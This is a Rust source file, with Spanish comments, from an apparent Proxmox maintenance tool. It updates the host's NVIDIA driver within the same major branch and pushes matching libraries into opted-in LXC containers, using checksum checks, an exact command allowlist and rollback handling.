//! Actualización del driver NVIDIA del host (instalado con el `.run` oficial) y de las librerías de los CT, como paso OPCIONAL de la corrida
//! programada: `[update] host_nvidia_auto` (host) y `[[ct]] nvidia_auto` (CT). Sin esos opt-ins el timer no toca nada de NVIDIA.
//!
//! Fuente única (NVIDIA, sin intermediarios): índice `https://download.nvidia.com/XFree86/Linux-x86_64/` (una línea `href='<versión>/'` por
//! versión); por versión, `NVIDIA-Linux-x86_64-<v>.run` y `.run.sha256sum` (`<hash>  <archivo>`). Solo se sube dentro de la MISMA rama mayor
//! (595.x → 595.y), nunca a otra.
//!
//! Orden (cualquier fallo antes de tocar el sistema aborta ESE paso y deja todo como estaba): reinicio pendiente → lecturas (versión cargada,
//! `nvidia-uninstall`, índice) → descarga + sha256 + `--check` → cabeceras del kernel + compilación de prueba (`--extract-only`) → (solo aquí
//! se toca el sistema) parar los CT con GPU → `modprobe -r` → instalar con `--dkms` → verificar con `nvidia-smi` → arrancar los CT → librerías
//! de los CT con `nvidia_auto` (`--no-kernel-modules`) y reinicio de cada uno. Si el driver del host falla, NINGÚN CT recibe librerías, los CT
//! parados se vuelven a arrancar si el módulo viejo aún carga, y la corrida se corta. Nunca reinicia el host.
use super::{now_s, stamp, Ctx, Event, Outcome};
use crate::share::config::Config;
use crate::share::host::{ExecOpts, Host, NvidiaOptIn};
use crate::share::model::GuestKind;
use crate::share::proxmox::guests::{lxc_running, Inventory};
use crate::share::proxmox::hostcheck;
use serde::Serialize;
use std::cmp::Ordering;
use std::path::Path;
use std::sync::atomic::{AtomicBool, Ordering as AtomicOrdering};

pub const INDEX_URL: &str = "https://download.nvidia.com/XFree86/Linux-x86_64/";
/// Lectura del índice (sin opt-in: también la usa la TUI para decidir si ofrece el modal).
pub const INDEX_CURL: &[&str] = &["curl", "-fsS", "--proto", "=https", "--max-time", "30", INDEX_URL];
/// Bajo `/var/lib` (solo root crea ahí): `/var/tmp` es sticky y de escritura pública, y otro usuario podía precrear la carpeta o un symlink.
pub const WORK_DIR: &str = "/var/lib/pxu-nvidia";
/// Dentro de cada CT el instalador va a un directorio nuevo (`mktemp -d`, 0700, del root del CT) bajo `/var/lib` (no `/var/tmp`, sticky y de escritura pública).
pub const CT_DIR_PREFIX: &str = "/var/lib/pxu-nvidia.";
const CT_RUN_NAME: &str = "nvidia.run";
/// Instalador que deja el `.run`: su presencia = el driver NO viene de apt.
pub const UNINSTALL: &str = "/usr/bin/nvidia-uninstall";
const NVRM: &str = "/proc/driver/nvidia/version";
/// Libre mínimo en el host (descarga ~400 MB + extracción + compilación) y en cada CT (extracción del `.run`, como ProxMenux).
pub const MIN_FREE_HOST_KB: u64 = 4 * 1024 * 1024;
pub const MIN_FREE_CT_KB: u64 = 1500 * 1024;
/// Tope de las dos instalaciones (host y librerías de un CT): se espera de verdad (`no_kill_on_timeout`).
const LONG_S: u64 = 3600;
/// Pasos que no tocan el sistema (se pueden cortar): descarga, extracción y compilación de prueba, copia al CT.
const FETCH_S: u64 = 1800;
/// `sha256sum` y `--check` del instalador.
const VERIFY_S: u64 = 600;
/// Órdenes `pct` con espera propia (parar, arrancar, copiar: 90–120 s).
const PCT_S: u64 = 120;
/// Cola de SIGTERM + SIGKILL de una orden que se corta.
const CUT_S: u64 = 30;

/// Peor caso del paso, sumando TODAS las órdenes que puede ejecutar (el test `worst_s_covers_every_command_it_runs` lo comprueba contra el mock):
/// host = descarga, sha256, `--check`, extracción, compilación de prueba, instalación (esta con el margen de `no_kill_on_timeout`) y 16 consultas;
/// cada CT con GPU = parar y arrancar (dos veces: la recuperación repite el arranque), copia, sha256, instalador (con margen), borrado, `nvidia-smi`, reinicio y 8 consultas.
pub fn worst_s(cfg: &Config, gpu_cts: u64) -> u64 {
    let q = cfg.check.timeout_s + CUT_S;
    let kill = super::NO_KILL_TAIL_S;
    let host = 3 * (FETCH_S + CUT_S) + 2 * (VERIFY_S + CUT_S) + (LONG_S + kill) + 16 * q;
    let ct = (FETCH_S + CUT_S) + (LONG_S + kill) + 6 * (PCT_S + CUT_S) + 8 * q;
    host + gpu_cts * ct
}

// ---------------------------------------------------------------- versiones

/// `595.112.07` → `[595, 112, 7]` (2 o 3 tramos numéricos).
pub fn parse_version(v: &str) -> Option<Vec<u64>> {
    let p: Vec<&str> = v.split('.').collect();
    if !(2..=3).contains(&p.len()) || p.iter().any(|s| s.is_empty() || s.len() > 6 || !s.bytes().all(|b| b.is_ascii_digit())) {
        return None;
    }
    p.iter().map(|s| s.parse().ok()).collect()
}

pub fn version_cmp(a: &str, b: &str) -> Ordering {
    parse_version(a).cmp(&parse_version(b))
}

pub fn major(v: &str) -> Option<u64> {
    parse_version(v).and_then(|p| p.first().copied())
}

/// Versiones del índice (`<a href='595.58.03/'>`, comillas simples en el índice real; también acepta dobles): solo directorios con forma de versión, sin repetidos, de menor a mayor.
pub fn parse_index(html: &str) -> Vec<String> {
    let mut v: Vec<String> = html.split("href=").skip(1).filter_map(|r| {
        let q = r.chars().next().filter(|c| *c == '\'' || *c == '"')?;
        r[1..].split(q).next()
    }).filter_map(|h| h.strip_suffix('/')).filter(|h| parse_version(h).is_some()).map(String::from).collect();
    v.sort_by(|a, b| version_cmp(a, b));
    v.dedup();
    v
}

/// La mayor versión de la MISMA rama mayor que `current` y estrictamente más nueva.
pub fn newest_in_branch(versions: &[String], current: &str) -> Option<String> {
    let m = major(current)?;
    versions.iter().filter(|v| major(v) == Some(m) && version_cmp(v, current) == Ordering::Greater).max_by(|a, b| version_cmp(a, b)).cloned()
}

/// `open` si el módulo cargado es el de código abierto (`NVIDIA UNIX Open Kernel Module`); si no, `proprietary`.
pub fn flavor_of(nvrm: &str) -> &'static str {
    if nvrm.contains("Open Kernel Module") { "open" } else { "proprietary" }
}

fn kernel_ok(k: &str) -> bool {
    !k.is_empty() && k.len() <= 64 && k.bytes().all(|b| b.is_ascii_alphanumeric() || b"._+-".contains(&b))
}

/// `<hash>  <archivo>` → el hash (64 hex) si el archivo es el esperado.
pub fn parse_sha(text: &str, file: &str) -> Option<String> {
    let mut t = text.lines().find(|l| !l.trim().is_empty())?.split_whitespace();
    let (h, f) = (t.next()?, t.next()?);
    (h.len() == 64 && h.bytes().all(|b| b.is_ascii_hexdigit()) && f.trim_start_matches('*') == file).then(|| h.to_ascii_lowercase())
}

// ---------------------------------------------------------------- comandos (única fuente: motor, mock y lista blanca)

pub fn run_file(v: &str) -> String {
    format!("NVIDIA-Linux-x86_64-{v}.run")
}
pub fn run_path(v: &str) -> String {
    format!("{WORK_DIR}/{}", run_file(v))
}
pub fn run_url(v: &str) -> String {
    format!("{INDEX_URL}{v}/{}", run_file(v))
}
pub fn sha_url(v: &str) -> String {
    format!("{}.sha256sum", run_url(v))
}
fn extract_dir(v: &str) -> String {
    format!("{WORK_DIR}/extract-{v}")
}
fn kdir(flavor: &str) -> &'static str {
    if flavor == "open" { "kernel-open" } else { "kernel" }
}

pub type Argv = Vec<String>;

fn a(parts: &[&str]) -> Argv {
    parts.iter().map(|s| s.to_string()).collect()
}

/// Lo que el opt-in deja pasar: la versión elegida (ya validada), el kernel en marcha, el sabor del módulo, los CT que se paran/arrancan
/// y los CT a los que se les ponen las librerías. Todo sale de las opciones (`host_nvidia_auto`, `nvidia_auto`) y del inventario.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Grant {
    pub version: String,
    pub kernel: String,
    pub flavor: String,
    /// CT con GPU NVIDIA en marcha: se paran antes de descargar el módulo y se vuelven a arrancar.
    pub stop_cts: Vec<u32>,
    /// CT con `nvidia_auto`: reciben las librerías de `version`.
    pub libs_cts: Vec<u32>,
}

impl Grant {
    pub fn new(version: &str, kernel: &str, flavor: &str, stop_cts: Vec<u32>, libs_cts: Vec<u32>) -> Option<Grant> {
        (parse_version(version).is_some() && kernel_ok(kernel) && matches!(flavor, "open" | "proprietary")).then(|| Grant { version: version.into(), kernel: kernel.into(), flavor: flavor.into(), stop_cts, libs_cts })
    }
    pub fn mkdir(&self) -> Argv { a(&["install", "-d", "-m", "0700", "-o", "root", "-g", "root", WORK_DIR]) }
    pub fn df(&self) -> Argv { a(&["df", "-Pk", WORK_DIR]) }
    pub fn fetch_sha(&self) -> Argv { a(&["curl", "-fsS", "--proto", "=https", "--max-time", "30", &sha_url(&self.version)]) }
    pub fn download(&self) -> Argv { a(&["curl", "-fSL", "--proto", "=https", "--retry", "3", "--max-time", "3600", "-o", &run_path(&self.version), &run_url(&self.version)]) }
    pub fn sha256sum(&self) -> Argv { a(&["sha256sum", &run_path(&self.version)]) }
    pub fn check(&self) -> Argv { a(&["sh", &run_path(&self.version), "--check"]) }
    pub fn extract(&self) -> Argv { a(&["sh", &run_path(&self.version), "--extract-only", "--target", &extract_dir(&self.version)]) }
    pub fn make(&self) -> Argv {
        a(&["make", "-C", &format!("{}/{}", extract_dir(&self.version), kdir(&self.flavor)), "-j4", &format!("SYSSRC=/lib/modules/{}/build", self.kernel), "modules"])
    }
    pub fn persistenced(&self, start: bool) -> Argv { a(&["systemctl", if start { "start" } else { "stop" }, "nvidia-persistenced"]) }
    pub fn unload(&self) -> Argv { a(&["modprobe", "-r", "nvidia_uvm", "nvidia_drm", "nvidia_modeset", "nvidia"]) }
    pub fn load(&self) -> Argv { a(&["modprobe", "nvidia"]) }
    pub fn install(&self) -> Argv {
        a(&["sh", &run_path(&self.version), "--no-questions", "--ui=none", "--no-nouveau-check", "--dkms", &format!("--kernel-module-type={}", self.flavor), &format!("--tmpdir={WORK_DIR}")])
    }
    pub fn cleanup(&self) -> Argv { a(&["rm", "-rf", "--", WORK_DIR]) }
    pub fn smi(&self) -> Argv { a(hostcheck::NVIDIA_SMI) }
    pub fn ct_shutdown(&self, id: u32) -> Argv { a(&["pct", "shutdown", &id.to_string(), "--timeout", "60"]) }
    pub fn ct_stop(&self, id: u32) -> Argv { a(&["pct", "stop", &id.to_string()]) }
    pub fn ct_start(&self, id: u32) -> Argv { a(&["pct", "start", &id.to_string()]) }
    pub fn ct_reboot(&self, id: u32) -> Argv { a(&["pct", "reboot", &id.to_string()]) }
    pub fn ct_push(&self, id: u32, dir: &str) -> Argv {
        a(&["pct", "push", &id.to_string(), &run_path(&self.version), &ct_run(dir), "--user", "0", "--group", "0", "--perms", "0700"])
    }

    fn fixed(&self) -> Vec<Argv> {
        vec![
            self.mkdir(), self.df(), self.fetch_sha(), self.download(), self.sha256sum(), self.check(), self.extract(), self.make(), self.persistenced(true), self.persistenced(false),
            self.unload(), self.load(), self.install(), self.cleanup(), self.smi(), a(hostcheck::DKMS),
        ]
    }
}

/// Dentro de un CT: `df`, directorio temporal privado, `sha256sum`/instalador/borrado sobre ese directorio y la versión.
pub const CT_DF: &[&str] = &["df", "-Pk", "/var/lib"];
pub const CT_MKTEMP: &[&str] = &["mktemp", "-d", "/var/lib/pxu-nvidia.XXXXXXXX"];

/// `mktemp -d` devuelve exactamente `CT_DIR_PREFIX` + 8 caracteres alfanuméricos: cualquier otra cosa no se usa.
pub fn ct_dir_ok(d: &str) -> bool {
    d.strip_prefix(CT_DIR_PREFIX).is_some_and(|r| r.len() == 8 && r.bytes().all(|b| b.is_ascii_alphanumeric()))
}
fn ct_run(dir: &str) -> String { format!("{dir}/{CT_RUN_NAME}") }
pub fn ct_sha(dir: &str) -> Argv { a(&["sha256sum", &ct_run(dir)]) }
pub fn ct_rm(dir: &str) -> Argv { a(&["rm", "-rf", "--", dir]) }
pub fn ct_libs_argv(dir: &str) -> Argv {
    a(&["sh", &ct_run(dir), "--no-kernel-modules", "--no-questions", "--ui=none", "--no-nouveau-check", "--no-dkms", "--no-install-compat32-libs", &format!("--tmpdir={dir}")])
}

fn eq(argv: &[&str], b: &[String]) -> bool {
    argv.len() == b.len() && argv.iter().zip(b).all(|(x, y)| x == y)
}

/// Comandos del host que el opt-in NVIDIA deja pasar (exactos; los `pct` solo para los vmid del permiso).
pub fn is_host_argv(argv: &[&str], g: &Grant) -> bool {
    if g.fixed().iter().any(|f| eq(argv, f)) {
        return true;
    }
    g.stop_cts.iter().chain(&g.libs_cts).any(|&id| [g.ct_shutdown(id), g.ct_stop(id), g.ct_start(id), g.ct_reboot(id)].iter().any(|f| eq(argv, f)))
        || ct_dir_in(argv).is_some_and(|d| g.libs_cts.iter().any(|&id| eq(argv, &g.ct_push(id, d))))
}

/// Comandos dentro de un CT (solo los de `libs_cts`).
pub fn is_guest_argv(argv: &[&str], vmid: u32, g: &Grant) -> bool {
    g.libs_cts.contains(&vmid) && (argv == CT_DF || argv == CT_MKTEMP || argv == hostcheck::NVIDIA_SMI || ct_dir_in(argv).is_some_and(|d| [ct_sha(d), ct_rm(d), ct_libs_argv(d)].iter().any(|f| eq(argv, f))))
}

/// El directorio temporal de un CT que aparece en `argv` (en `pct push`, `sha256sum`, el instalador o `rm -rf`), solo si tiene la forma exacta.
fn ct_dir_in<'a>(argv: &[&'a str]) -> Option<&'a str> {
    argv.iter().find_map(|x| x.strip_suffix(&format!("/{CT_RUN_NAME}")).or_else(|| x.strip_prefix("--tmpdir=")).or(Some(x)).filter(|d| ct_dir_ok(d)))
}

// ---------------------------------------------------------------- oferta (TUI)

/// Lo que la TUI muestra en el modal.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Offer {
    pub current: String,
    pub newest: Newest,
}

/// Resultado (informativo) de mirar el índice de NVIDIA al abrir el modal.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Newest {
    /// Hay una versión más nueva en la misma rama.
    Newer(String),
    UpToDate,
    /// Sin red, timeout o índice ilegible.
    Unknown,
}

/// Tope de la consulta del modal: no debe congelar la TUI.
const OFFER_TIMEOUT_S: u64 = 5;

/// Versión del driver cargado en el host (`/proc/driver/nvidia/version`) y su sabor.
pub fn host_driver(host: &dyn Host) -> Option<(String, &'static str)> {
    let t = crate::share::host::read_string(host, NVRM).ok()?;
    Some((hostcheck::parse_nvrm(&t)?, flavor_of(&t)))
}

fn fetch_versions(host: &dyn Host, timeout_s: u64) -> Result<Vec<String>, String> {
    let mut out: Vec<String> = Vec::new();
    let o = ExecOpts { timeout_s: Some(timeout_s), env: vec![("LC_ALL".into(), "C".into())], ..Default::default() };
    let e = host.host_cmd(INDEX_CURL, &o, &mut out).map_err(|e| e.to_string())?;
    if e.code != 0 {
        return Err(format!("curl exit {}", e.code));
    }
    let v = parse_index(&out.join("\n"));
    if v.is_empty() { Err("the NVIDIA index lists no versions".into()) } else { Ok(v) }
}

/// ¿Se ofrece el opt-in del driver al activar el auto-update? Solo si la máquina usa la GPU (host: driver instalado por el `.run` y módulo cargado;
/// CT: NVIDIA según su `.conf`). NO depende de que haya una versión más nueva: eso solo se informa (`Newest`). Cualquier otra cosa = `None`.
pub fn offer(host: &dyn Host, inv: &Inventory, vmid: u32, timeout_s: u64) -> Option<Offer> {
    offer_why(host, inv, vmid, timeout_s).ok()
}

/// Como `offer`, pero dice por qué no hay oferta (para la barra de estado de la TUI).
pub fn offer_why(host: &dyn Host, inv: &Inventory, vmid: u32, timeout_s: u64) -> Result<Offer, &'static str> {
    let uses = if vmid == 0 { true /* el host usa la GPU si el módulo está cargado (abajo) */ } else { inv.guests.iter().find(|g| g.vmid == vmid).is_some_and(|g| g.kind == GuestKind::Lxc && g.gpu.nvidia) };
    if !uses {
        return Err("no NVIDIA GPU");
    }
    if !host.exists(Path::new(UNINSTALL)) {
        return Err("driver not installed with the .run");
    }
    let (current, _) = host_driver(host).ok_or("NVIDIA driver not loaded on the host")?;
    let newest = match fetch_versions(host, timeout_s.min(OFFER_TIMEOUT_S)) {
        Ok(v) => newest_in_branch(&v, &current).map_or(Newest::UpToDate, Newest::Newer),
        Err(_) => Newest::Unknown,
    };
    Ok(Offer { current, newest })
}

// ---------------------------------------------------------------- informe

#[derive(Debug, Clone, Serialize)]
pub struct NvidiaCt {
    pub vmid: u32,
    pub name: String,
    pub outcome: Outcome,
    pub detail: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct NvidiaRun {
    pub outcome: Outcome,
    pub from: Option<String>,
    pub to: Option<String>,
    pub detail: String,
    pub log_path: Option<String>,
    pub took_s: u64,
    pub cts: Vec<NvidiaCt>,
}

impl NvidiaRun {
    pub(super) fn skipped(why: &str) -> NvidiaRun {
        NvidiaRun { outcome: Outcome::Skipped, from: None, to: None, detail: why.into(), log_path: None, took_s: 0, cts: vec![] }
    }
}

// ---------------------------------------------------------------- motor

fn quick(cfg: &Config) -> ExecOpts<'static> {
    ExecOpts { timeout_s: Some(cfg.check.timeout_s), env: vec![("LC_ALL".into(), "C".into())], ..Default::default() }
}

/// Las dos instalaciones: no se matan a mitad (`no_kill_on_timeout`).
fn long() -> ExecOpts<'static> {
    ExecOpts { timeout_s: Some(LONG_S), no_kill_on_timeout: true, env: vec![("LC_ALL".into(), "C".into())], ..Default::default() }
}

fn free_kb(cx: &Ctx) -> Option<u64> {
    super::hostupdate::parse_df_free_kb(&cx.capture.join("\n"))
}

/// Estado del paso mientras corre: contexto de log/eventos, versiones y resultados por CT.
struct Cx<'a> {
    cx: Ctx<'a>,
    started_at: u64,
    from: Option<String>,
    to: Option<String>,
    cts: Vec<NvidiaCt>,
    /// Timeout de los comandos cortos (`[check] timeout_s`).
    qs: u64,
}

/// El log de la corrida (`runlog`) recoge las líneas; aquí solo se arma la entrada del informe.
fn finish(c: &mut Cx, outcome: Outcome, detail: String) -> NvidiaRun {
    let took_s = now_s(c.cx.host).saturating_sub(c.started_at);
    NvidiaRun { outcome, from: c.from.clone(), to: c.to.clone(), detail, log_path: None, took_s, cts: std::mem::take(&mut c.cts) }
}

/// Paso del driver de la corrida programada. `None` = no hay nada que hacer (sin opt-in, o todo al día): ni entrada en el informe.
/// `Some((informe, motivo))`: `motivo` = la corrida debe pararse (el sistema se tocó y falló).
pub fn run(host: &dyn Host, inv: &Inventory, cfg: &Config, reboot_pending: bool, cancel: &AtomicBool, ev: &mut dyn FnMut(Event)) -> Option<(NvidiaRun, Option<String>)> {
    if !cfg.update.host_nvidia_auto {
        return None;
    }
    let started_at = now_s(host);
    let skip = |why: &str| Some((NvidiaRun::skipped(why), None));
    if reboot_pending {
        return skip("skipped: a host reboot is pending (new kernel installed, not running); reboot first, pxu never reboots the host");
    }
    let Some((cur, flavor)) = host_driver(host) else { return skip("skipped: no NVIDIA driver is loaded in the host") };
    if !host.exists(Path::new(UNINSTALL)) {
        return skip("skipped: the host driver was not installed with the NVIDIA .run (no nvidia-uninstall): apt-managed drivers are updated with the host");
    }
    let kernel = crate::share::host::read_string(host, "/proc/sys/kernel/osrelease").unwrap_or_default().trim().to_string();
    let mut probe: Vec<String> = Vec::new();
    let o = quick(cfg);
    let versions = match host.host_cmd(INDEX_CURL, &o, &mut probe) {
        Ok(e) if e.code == 0 => parse_index(&probe.join("\n")),
        Ok(e) => return skip(&format!("skipped: cannot read the NVIDIA index (curl exit {})", e.code)),
        Err(e) => return skip(&format!("skipped: cannot read the NVIDIA index: {e}")),
    };
    let newest = newest_in_branch(&versions, &cur);
    let host_needs = newest.is_some();
    let target = newest.clone().unwrap_or_else(|| cur.clone());
    // CT con GPU NVIDIA: en marcha → se paran con el módulo; con `nvidia_auto` → reciben las librerías si su versión no es la del destino
    let gpu_cts: Vec<&crate::share::model::Guest> = inv.guests.iter().filter(|g| g.kind == GuestKind::Lxc && !g.template && g.gpu.nvidia).collect();
    let stop_cts: Vec<u32> = if host_needs { gpu_cts.iter().filter(|g| lxc_running(host, g.vmid)).map(|g| g.vmid).collect() } else { vec![] };
    let ct_version = |vmid: u32| inv.host.as_ref().and_then(|h| h.ct_nvidia.get(&vmid.to_string())).and_then(|n| n.version.clone());
    let libs: Vec<&crate::share::model::Guest> = gpu_cts.iter().copied().filter(|g| cfg.nvidia_auto(g.vmid) && (host_needs || ct_version(g.vmid).as_deref() != Some(target.as_str()))).collect();
    if !host_needs && libs.is_empty() {
        return None;
    }
    let libs_cts: Vec<u32> = libs.iter().map(|g| g.vmid).collect();
    let Some(grant) = Grant::new(&target, &kernel, flavor, stop_cts.clone(), libs_cts.clone()) else { return skip("skipped: could not build a safe command set (unexpected version or kernel name)") };
    let mut c = Cx {
        cx: Ctx { host, vmid: 0, log: vec![], dropped: 0, capture: vec![], abort: None, hold: false, no_prune: false, ev, security: 0, cancel: None, interrupted: false, root_used_kb: None },
        started_at,
        from: Some(cur.clone()),
        to: Some(target.clone()),
        cts: vec![],
        qs: cfg.check.timeout_s,
    };
    c.cx.say(&format!("pxu NVIDIA driver update · {} · host {cur} ({flavor}) → {target}{}", stamp(started_at), if host_needs { "" } else { " (libs only: host already current)" }));
    // El permiso se deriva de las opciones del usuario y vale solo mientras dura este paso.
    let _optin = NvidiaOptIn::new(host, grant.clone());
    let (res, stop) = body(&mut c, cfg, &grant, host_needs, &libs, cancel);
    let _ = c.cx.host_cmd(&grant.cleanup().iter().map(String::as_str).collect::<Vec<_>>(), &quick(cfg));
    let (outcome, detail) = res;
    let run = finish(&mut c, outcome, detail);
    Some((run, stop))
}

fn argv(v: &[String]) -> Vec<&str> {
    v.iter().map(String::as_str).collect()
}

type Res = ((Outcome, String), Option<String>);

/// Todo el trabajo bajo el permiso. `Err`-like: el segundo valor es el motivo de cortar la corrida (solo si ya se tocó el sistema).
fn body(c: &mut Cx, cfg: &Config, g: &Grant, host_needs: bool, libs: &[&crate::share::model::Guest], cancel: &AtomicBool) -> Res {
    let fail = |c: &mut Cx, why: String| -> Res {
        c.cx.say(&format!("!! {why}"));
        ((Outcome::Failed, why), None)
    };
    // ---- preparación: solo toca WORK_DIR
    c.cx.step(super::Step::Preflight);
    let q = quick(cfg);
    // `install -d` seguiría un symlink y cambiaría el modo del destino: la ruta preexistente se valida ANTES (sin seguir symlinks) y otra vez después
    if let Err(why) = check_work_dir(c.cx.host, true) {
        return fail(c, why);
    }
    match c.cx.host_cmd(&argv(&g.mkdir()), &q) {
        Ok(0) => {}
        r => return fail(c, format!("cannot create {WORK_DIR}: {}", describe(&r))),
    }
    if let Err(why) = check_work_dir(c.cx.host, false) {
        return fail(c, why);
    }
    match c.cx.host_cmd(&argv(&g.df()), &q) {
        Ok(0) if free_kb(&c.cx).is_some_and(|k| k >= MIN_FREE_HOST_KB) => {}
        Ok(0) => return fail(c, format!("not enough free space in {WORK_DIR}: {} MB needed", MIN_FREE_HOST_KB / 1024)),
        r => return fail(c, format!("cannot check free space: {}", describe(&r))),
    }
    let file = run_file(&g.version);
    let want = match c.cx.host_cmd(&argv(&g.fetch_sha()), &q) {
        Ok(0) => parse_sha(&c.cx.capture.join("\n"), &file),
        r => return fail(c, format!("cannot download the checksum: {}", describe(&r))),
    };
    let Some(want) = want else { return fail(c, "the NVIDIA .sha256sum file is malformed".into()) };
    c.cx.step(super::Step::Refresh);
    match c.cx.host_cmd(&argv(&g.download()), &long_s(FETCH_S)) {
        Ok(0) => {}
        r => return fail(c, format!("download failed: {}", describe(&r))),
    }
    let got = match c.cx.host_cmd(&argv(&g.sha256sum()), &long_s(VERIFY_S)) {
        Ok(0) => c.cx.capture.iter().find_map(|l| l.split_whitespace().next().map(str::to_ascii_lowercase)),
        r => return fail(c, format!("sha256sum failed: {}", describe(&r))),
    };
    if got.as_deref() != Some(want.as_str()) {
        return fail(c, format!("SHA-256 mismatch for {file}: the download does not match NVIDIA's checksum; nothing was installed"));
    }
    c.cx.say("sha256 OK");
    match c.cx.host_cmd(&argv(&g.check()), &long_s(VERIFY_S)) {
        Ok(0) => c.cx.say("installer integrity (--check) OK"),
        r => return fail(c, format!("the .run integrity check failed: {}", describe(&r))),
    }
    if host_needs {
        // el compilador de prueba falla ANTES de quitar el driver actual (el instalador desinstala el viejo y luego compila)
        if !c.cx.host.exists(Path::new(&format!("/lib/modules/{}/build", g.kernel))) {
            return fail(c, format!("kernel headers for the running kernel are missing (/lib/modules/{}/build): the module could not be built", g.kernel));
        }
        for (what, cmd) in [("extract", g.extract()), ("test build", g.make())] {
            match c.cx.host_cmd(&argv(&cmd), &long_s(FETCH_S)) {
                Ok(0) => {}
                r => return fail(c, format!("{what} of the driver failed ({}); the current driver was not touched", describe(&r))),
            }
        }
        if cancel.load(AtomicOrdering::SeqCst) {
            return ((Outcome::Cancelled, "cancelled before touching the driver".into()), Some("cancelled by user".into()));
        }
        // ---- a partir de aquí se toca el sistema
        c.cx.step(super::Step::Upgrade);
        if let Some(r) = host_install(c, g) {
            return r;
        }
    }
    // ---- librerías de los CT (el host ya está bien)
    let mut bad = 0;
    for ct in libs {
        let r = ct_libs(c, g, ct.vmid, &ct.name, host_needs && g.stop_cts.contains(&ct.vmid), &want);
        if r.outcome == Outcome::Failed {
            bad += 1;
        }
        c.cts.push(r);
    }
    let n_ok = c.cts.iter().filter(|r| r.outcome == Outcome::Ok).count();
    let what = if host_needs { format!("host driver {} → {}", c.from.as_deref().unwrap_or("?"), g.version) } else { format!("host driver already {}", g.version) };
    let detail = format!("{what}; CT libs: {n_ok}/{} updated", libs.len());
    ((if bad > 0 { Outcome::Warn } else { Outcome::Ok }, detail), None)
}

/// `WORK_DIR` debe ser un directorio real (no symlink), de root y 0700. Ausente vale solo antes de crearlo (`may_be_missing`).
fn check_work_dir(host: &dyn Host, may_be_missing: bool) -> Result<(), String> {
    let m = match host.file_meta(Path::new(WORK_DIR)) {
        Ok(m) => m,
        Err(e) if may_be_missing && e.kind() == std::io::ErrorKind::NotFound => return Ok(()),
        Err(e) => return Err(format!("{WORK_DIR} is not usable ({e}); refusing to use it")),
    };
    if !m.is_dir {
        return Err(format!("{WORK_DIR} is not a directory; refusing to use it"));
    }
    if m.uid != 0 {
        return Err(format!("{WORK_DIR} is not owned by root (uid {}); refusing to use it", m.uid));
    }
    if m.mode != 0o700 {
        return Err(format!("{WORK_DIR} must be mode 0700 (it is {:04o}); refusing to use it", m.mode));
    }
    Ok(())
}

fn describe(r: &Result<i32, String>) -> String {
    match r {
        Ok(c) => format!("exit {c}"),
        Err(e) => e.clone(),
    }
}

/// Para los CT con GPU, descarga el módulo viejo e instala el nuevo con DKMS. `Some(resultado)` = falló (ya se recuperó lo posible).
fn host_install(c: &mut Cx, g: &Grant) -> Option<Res> {
    let q = long_s(c.qs);
    let mut stopped: Vec<u32> = vec![];
    for &id in &g.stop_cts {
        let _ = c.cx.host_cmd(&argv(&g.ct_shutdown(id)), &long_s(90));
        if lxc_running(c.cx.host, id) {
            let _ = c.cx.host_cmd(&argv(&g.ct_stop(id)), &long_s(90));
        }
        if lxc_running(c.cx.host, id) {
            c.cx.say(&format!("!! CT {id} did not stop"));
            return Some(recover(c, g, &stopped, format!("CT {id} did not stop: the module cannot be unloaded; nothing was changed")));
        }
        stopped.push(id);
    }
    let _ = c.cx.host_cmd(&argv(&g.persistenced(false)), &q);
    match c.cx.host_cmd(&argv(&g.unload()), &q) {
        Ok(0) => {}
        r => return Some(recover(c, g, &stopped, format!("the old NVIDIA module could not be unloaded ({}): something still uses it (DRM/KMS?); the old driver stays loaded", describe(&r)))),
    }
    match c.cx.host_cmd(&argv(&g.install()), &long()) {
        Ok(0) => {}
        r => return Some(recover(c, g, &stopped, format!("the NVIDIA installer failed ({})", describe(&r)))),
    }
    let ver = match c.cx.host_cmd(&argv(&g.smi()), &q) {
        Ok(0) => hostcheck::parse_smi_version(&c.cx.capture),
        _ => None,
    };
    if ver.as_deref() != Some(g.version.as_str()) {
        return Some(recover(c, g, &stopped, format!("verification failed: nvidia-smi reports {} instead of {}", ver.as_deref().unwrap_or("nothing"), g.version)));
    }
    c.cx.say(&format!("nvidia-smi: driver {} OK", g.version));
    let _ = c.cx.host_cmd(&argv(&g.persistenced(true)), &q);
    // los CT que solo dependen del módulo vuelven ya; los de `libs` arrancan en su paso
    for &id in stopped.iter().filter(|id| !g.libs_cts.contains(id)) {
        let _ = c.cx.host_cmd(&argv(&g.ct_start(id)), &long_s(90));
    }
    None
}

fn long_s(s: u64) -> ExecOpts<'static> {
    ExecOpts { timeout_s: Some(s), env: vec![("LC_ALL".into(), "C".into())], ..Default::default() }
}

/// Falló el driver del host: ningún CT recibe librerías; los CT parados vuelven a arrancar si el módulo viejo aún carga.
fn recover(c: &mut Cx, g: &Grant, stopped: &[u32], why: String) -> Res {
    c.cx.say(&format!("!! {why}"));
    let q = long_s(c.qs);
    let _ = c.cx.host_cmd(&argv(&g.persistenced(true)), &q);
    let loadable = matches!(c.cx.host_cmd(&argv(&g.load()), &q), Ok(0)) && matches!(c.cx.host_cmd(&argv(&g.smi()), &q), Ok(0));
    let mut note = String::new();
    if loadable && !stopped.is_empty() {
        for &id in stopped {
            let _ = c.cx.host_cmd(&argv(&g.ct_start(id)), &long_s(90));
        }
        note = format!("; the previous driver still loads: CT {} started again", stopped.iter().map(u32::to_string).collect::<Vec<_>>().join(", "));
    } else if !stopped.is_empty() {
        note = format!("; the NVIDIA module does NOT load: CT {} left stopped (fix the driver, then start them)", stopped.iter().map(u32::to_string).collect::<Vec<_>>().join(", "));
    }
    let detail = format!("{why}{note}; no CT received libs");
    c.cx.say(&format!("!! {detail}"));
    ((Outcome::Failed, detail), Some("NVIDIA driver update failed".into()))
}

/// Librerías de un CT: copia el `.run` a un directorio privado nuevo, revisa su SHA-256 allí, `--no-kernel-modules`, verifica con `nvidia-smi` y reinicia el CT.
fn ct_libs(c: &mut Cx, g: &Grant, vmid: u32, name: &str, we_stopped_it: bool, want: &str) -> NvidiaCt {
    let done = |c: &mut Cx, outcome: Outcome, detail: &str| {
        c.cx.say(&format!("CT {vmid}: {detail}"));
        NvidiaCt { vmid, name: name.into(), outcome, detail: detail.into() }
    };
    c.cx.vmid = vmid;
    let was_running = we_stopped_it || lxc_running(c.cx.host, vmid);
    if !was_running {
        return done(c, Outcome::Skipped, "CT stopped: not started by pxu, libs not updated");
